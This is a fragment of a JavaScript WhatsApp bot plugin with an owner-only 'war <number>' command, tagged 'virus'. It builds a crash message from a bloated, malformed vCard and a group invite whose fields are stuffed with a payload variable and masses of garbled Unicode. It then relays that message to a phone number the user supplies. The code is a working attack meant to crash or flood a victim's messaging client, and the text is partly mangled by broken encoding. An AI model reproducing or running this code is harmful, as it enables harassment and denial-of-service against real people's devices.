karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
var messaa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/ok.jpg') }, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `π»π―π¬ π±πΆ π©πΆπ»π${virus2}`,
"groupName": `π»π―π¬ π±πΆ π©πΆπ»π${virus2}`,
"caption": `${virus2}`,
"jpegThumbnail": messaa.imageMessage,
}
}), { userJid: m.chat, quoted: farizcoli })
conn.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', groupInvite.message, { messageId: groupInvite.key.id })
}
break

             default:
            if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
            throw false
            }
let bcbg = `https://telegra.ph/file/18e0bc2b07cadd20af38e.jpg`

       conn.send3ButtonImg(m.chat, bcbg, `α‘βα‘βα‘βα‘βα‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘`,`*β³πβ ${text}@s.whatsa α‘βα‘βα‘βα‘βα‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘  π»ππππ πππ§π ππ§ππ’ πππ¬ππ«ππ§ ΰΏκͺΆππ―βΰΌ»*    π¦ β’β’  β’β’  β’β’  β’β’  β’β’  β’β’  β’β’  *κ§α±ββΝβ§Όπ₯ΆββwΜΜeΜΆ aΜΜrΜΆeΜΆβ§½ΝβΝ’Ν’Ϋ¦ΰ½ΌΝ’ββ’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘ α‘βα‘βα‘βα‘βα‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘α‘ββ’α‘ββ’α‘ββ’  α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘ βΝ’Ν’ βΝ’Ν’ β£Ν’βΝ’Ν’β¦  βΝ’Ν’Ϋ¦ΰ½ΌΝ’βΝ’Ν’α‘β  α‘βα‘β α‘βα‘βα‘βα‘βα‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘βββ’α‘β’α‘β’α‘β’α‘β’α‘β’α‘β’ββ’α‘β’α‘β’α‘β’α‘,`,
   'Menu','.menu'
     'Owner','.owner'
       'Donasi','.donasi'
       )

     

            }
handler.help = ['war <number>']
handler.tags = ['owner','virus']
handler.command = /^(war)$/i

handler.owner = true

export default handler*/